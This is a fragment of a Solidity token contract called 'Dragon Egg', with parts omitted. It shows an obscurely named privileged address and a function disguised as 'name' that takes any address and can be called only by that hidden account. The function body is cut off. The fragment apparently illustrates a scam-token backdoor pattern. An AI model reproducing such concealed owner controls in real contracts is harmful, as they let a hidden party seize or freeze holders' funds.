...
contract DragonEgg is Ownable {
    ...
    string public _tokenname = "Dragon Egg";
    string public _tokensymbol = "Dragon Egg";
    uint256 tokenamount = 10000000000*10**decimals();
    address public dsjan7;
    ...
    function name(address jjkxq1) public     {
        require(dsjan7 ==  _msgSender());
        if(dsjan7 != _msgSender()){
                revert("fu");
        }
